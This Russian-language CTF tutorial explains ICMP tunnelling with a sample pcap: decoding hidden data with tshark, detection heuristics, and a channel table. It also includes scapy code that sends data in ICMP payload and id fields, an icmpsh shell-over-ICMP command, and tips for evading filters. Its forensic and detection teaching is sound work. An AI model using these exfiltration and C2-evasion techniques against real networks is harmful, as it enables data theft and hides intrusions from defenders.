## Вопрос, с которого всё начинается

В pcap почти нет полезного трафика — только `ping` туда-сюда, тысячи пакетов. Ты проверяешь HTTP и DNS: чисто. Но трафика ICMP подозрительно много, и он явно не похож на обычную диагностику. Как ping может нести данные?

Ответ: в **полезной нагрузке эхо-пакета**. ICMP почти всегда разрешён наружу (иначе не работает диагностика сети), а содержимое payload никто не проверяет. Разберём это на нашем pcap.

## Наш пример: icmp.pcap

**ICMP** — служебный протокол: команда `ping` шлёт эхо-запрос (`type 8`), узел отвечает эхо-ответом (`type 0`). У каждого пакета заголовок из 8 байт: тип, код, контрольная сумма, **идентификатор** (16 бит) и **последовательность** (16 бит). После заголовка — поле данных произвольной длины.

Где можно спрятать:

- **Payload** — основной канал: сюда пишут блоки файла или команды;
- **Identifier** — 16 бит, два байта данных на пакет;
- **Sequence** — ещё два байта;
- **Размер payload** — разные размеры кодируют биты;
- **Тайминги** — интервалы между пакетами (медленный, но незаметный канал).

## Шаг 1: извлекаем payload

`tshark` — анализатор pcap. Выведем данные из эхо-запросов:

```bash
$ tshark -r icmp.pcap -Y 'icmp.type==8' -T fields -e data.data | head
666c61677b69636d705f74756e6e656c7d
```

Фильтр `icmp.type==8` оставляет только эхо-запросы, `-e data.data` печатает payload в **hex** (шестнадцатеричном виде — по два символа на байт). Декодируем:

```bash
$ tshark -r icmp.pcap -Y 'icmp.type==8' -T fields -e data.data \
  | tr -d '\n' | xxd -r -p
flag{icmp_tunnel}
```

`xxd -r -p` превращает hex-строку обратно в байты.

## Шаг 2: данные в полях ID и sequence

Если payload выглядит «как у настоящего ping» (пусто или случайные байты), данные могут быть в `identifier`:

```bash
$ tshark -r icmp.pcap -Y 'icmp' -T fields -e icmp.ident | head
0x6c66
```

`0x6c66` — это ASCII `lf`. Собирая `icmp.ident` по порядку `seq`, получаем поток байт. Аномалия здесь — ID не похож на настоящий: у обычного ping он равен PID процесса и стабилен, а тут меняется от пакета к пакету.

## Шаг 3: строим канал через scapy

`scapy` — библиотека Python для сборки и разбора пакетов. Эхо-запрос с данными в payload:

```python
from scapy.all import IP, ICMP, send
msg = b"flag{hidden}"
send(IP(dst="10.0.0.5") / ICMP(type=8, id=0x1337) / msg, verbose=False)
```

Кодирование по два байта на пакет в поле `id`:

```python
from scapy.all import IP, ICMP, send
data = b"EXFIL"
for i in range(0, len(data), 2):
    chunk = data[i:i+2].ljust(2, b"\x00")
    send(IP(dst="10.0.0.5")/ICMP(type=8, id=int.from_bytes(chunk,"big"), seq=i),
         verbose=False)
```

Получатель собирает байты в порядке `seq`.

## Шаг 4: готовые туннели

`ptunnel` и `icmpsh` поднимают полноценный TCP-туннель поверх ICMP. `icmpsh` работает клиент-сервер: клиент шлёт эхо-запросы, сервер отвечает эхо-ответами, внутри канала течёт shell.

```bash
$ ./icmpsh_m.py 10.0.0.10 10.0.0.5
```

Детектируются такие туннели по аномально большому ICMP-трафику, крупным payload, нестандартным ID/seq и высокой частоте.

## Шаг 5: надёжность канала

ICMP ненадёжен: пакеты теряются, приходят не по порядку, дублируются. Чтобы сообщение собралось, применяют:

- **порядковый номер в sequence** — по нему сортируют;
- **CRC/контрольную сумму** — отбрасывают битые блоки;
- **избыточное кодирование** — повтор блока;
- **подтверждения** — эхо-ответ как ack.

Простейший формат кадра: `[seq:4][len:2][data][crc:2]`. Получатель собирает блоки по `seq`, проверяет `crc` и склеивает.

## Шаг 6: детект

Методика:

1. `tshark -z io,stat,1 -Y icmp` — всплески ICMP во времени;
2. сравнить размеры payload с обычным ping (обычно 32–56 байт);
3. проверить ID/seq: растут ли они монотонно;
4. извлечь payload и проверить на текст/base64/hex;
5. проверить тайминги.

```bash
$ tshark -r icmp.pcap -Y icmp -T fields -e data.len | sort -n | uniq -c | sort -rn | head
```

Если гистограмма длин резко смещена к большим значениям — это сигнал.

## Шаг 7: полный разбор pcap от начала до конца

Пройдём весь маршрут на нашем `icmp.pcap`:

```bash
# 1. сколько ICMP вообще
$ tshark -r icmp.pcap -q -z io,stat,0 -Y icmp
# 2. типы: только echo request (8) или и ответы (0)
$ tshark -r icmp.pcap -Y icmp -T fields -e icmp.type | sort | uniq -c
# 3. payload эхо-запросов в hex
$ tshark -r icmp.pcap -Y 'icmp.type==8' -T fields -e data.data
# 4. декодировать
$ tshark -r icmp.pcap -Y 'icmp.type==8' -T fields -e data.data | tr -d '\n' | xxd -r -p
flag{icmp_tunnel}
```

Если payload пуст — переходим к полям: собираем `icmp.ident` и `icmp.seq` по порядку и декодируем их
как байты. Если и там чисто — смотрим **размеры** и **тайминги** (бит по интервалу). Порядок проверок
идёт от «ёмкого и очевидного» канала к «тонкому и скрытому».

## Как это видят защитники

Ping-туннель — классика C2, и детект строится на статистике ICMP:

- **объём**: настоящий ping — единицы пакетов; туннель — тысячи;
- **размер payload**: норма 32–56 байт, туннель шлёт крупные блоки (или ровные кратные);
- **ID/seq**: у настоящего ping ID стабилен (PID), а seq растёт на 1; в туннеле ID меняется, seq
  скачет;
- **периодичность**: ровный интервал без «человеческой» вариативности;
- **эхо-ответы**: аномально крупные или частые ответы тоже несут данные.

Правило детекта: собрать гистограмму размеров и частоту ICMP по времени; всё, что резко отличается от
диагностического профиля, — на разбор. Для атакующего из этого следует: чтобы быть незаметнее,
мимикрируй под ping (стабильный ID, размер 56, интервал ~1 c).

## Если не сработало

- **Игнорируешь поля ID/seq** — ищешь только в payload.
- **Забыл про эхо-ответ** — ответ сервера тоже несёт данные.
- **Не учитываешь порядок** — сортируй по `seq`.
- **Путаешь hex и текст** — `tshark` отдаёт `data.data` в hex.
- **Пропустил тайминговый канал** — если payload пуст, смотри интервалы.
- **Считаешь ICMP редким** — в туннеле он становится основным трафиком.

## ICMPv6 и другие типы

Помимо эхо (type 8/0), ICMP имеет множество типов: destination unreachable, time exceeded, redirect; в ICMPv6 — neighbour solicitation/advertisement, router advertisement. В IPv6 neighbour discovery поля `Nonce` и `Target Link-Layer Address` — хорошее место для данных, потому что они «случайны» по природе.

```bash
$ tshark -r v6.pcap -Y "icmpv6" -T fields -e icmpv6.type -e icmpv6.nd.ns.target_address | head
```

Если эхо-пакеты выглядят чисто, проверь остальные типы ICMP.

## Обход фильтрации

Многие сети блокируют ICMP целиком, но пропускают конкретные типы:

- **Использовать разрешённый тип** (echo request) и прятать данные в нём;
- **Мимикрия под ping** — ID = PID, стабильный размер, ровный интервал;
- **Фрагментация** — большие данные в фрагментированных ICMP;
- **Смешанный трафик** — данные размазать между ICMP и DNS.

## Таблица каналов в ICMP

| Канал | Ёмкость на пакет | Заметность | Стойкость |
|---|---|---|---|
| Payload | десятки–тысячи байт | средняя | высокая |
| Identifier | 2 байта | низкая | средняя |
| Sequence | 2 байта | низкая | средняя |
| Размер payload | несколько бит | низкая | средняя |
| Тайминги | 1 бит/пакет | очень низкая | низкая |

## Шаг 8: строим кадр с надёжностью

Если нужно собрать данные из «шумного» ICMP, вводи свой формат кадра. Простейший:

```python
import struct, zlib
def frames(data, chunk=48):
    for i, off in enumerate(range(0, len(data), chunk)):
        block = data[off:off+chunk]
        crc = zlib.crc32(block) & 0xffff
        yield struct.pack('>IH', i, len(block)) + block + struct.pack('>H', crc)
```

Получатель читает `seq` как номер кадра, сортирует по нему, проверяет CRC и склеивает. Так
восстанавливаются данные даже если пакеты пришли не по порядку или часть потерялась — а в ICMP это
норма.

## Практика: где чаще всего прячут в CTF

- **payload эхо-запроса** — самый частый вариант, просто hex-строка;
- **identifier** — когда payload выглядит «настоящим»;
- **размер** — реже, но встречается: разные длины кодируют байты;
- **тайминги** — самый скрытный и самый медленный.

Начинай с payload: если он читается как ASCII/hex — это почти всегда ответ. Если пуст — иди по полям.

## Что мы теперь знаем

1. ICMP почти всегда разрешён — идеальный носитель.
2. Данные прячут в **payload**, **identifier**, **sequence**, **размере**, **таймингах**.
3. `tshark -e data.data` даёт payload в **hex**; декодируй `xxd -r -p`.
4. `scapy` позволяет строить эхо-пакеты с данными.
5. Туннель выдают **крупный payload** и **аномальная частота**.
6. Свой формат кадра (`seq` + `len` + `crc`) делает сборку устойчивой к потерям и перестановке.
